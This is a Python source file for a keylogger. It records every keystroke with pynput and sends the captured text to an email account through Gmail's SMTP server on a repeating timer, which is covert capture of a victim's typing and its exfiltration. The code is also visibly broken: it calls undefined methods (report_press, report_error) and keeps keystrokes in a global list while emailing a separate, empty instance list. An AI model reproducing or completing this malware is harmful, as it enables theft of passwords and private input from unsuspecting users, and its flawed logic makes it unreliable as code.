import pynput.keyboard
import threading
import smtplib
import email

log_catcher = []

class Keylogger:
    def __init__(self, time_interval, email, password) -> None:
        self.log_catcher = []
        self.interval = time_interval
        self.email = email
        self.password = password
        
    def append_to_registry(self, string):
        self.log_catcher.append(string)
    
    def process_key_press(self, key):
        global log_catcher
        try:
            log_catcher.append(str(key.char))
        except AttributeError:
            if key == key.space:
                log_catcher.append(' ')
            else:
                log_catcher.append(str(key))
        finally:
            print("[+] Key pressed: ", log_catcher)

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report_press_inform(self):
        self.send_email(self.email, self.password, "\n".join(self.log_catcher))
        print("[+] Report Inform", log_catcher)
        log_catcher = []
        timer = threading.Timer(self.interval, self.report_press)
        timer.start()


    def start_catcher(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report_error()
            keyboard_listener.join()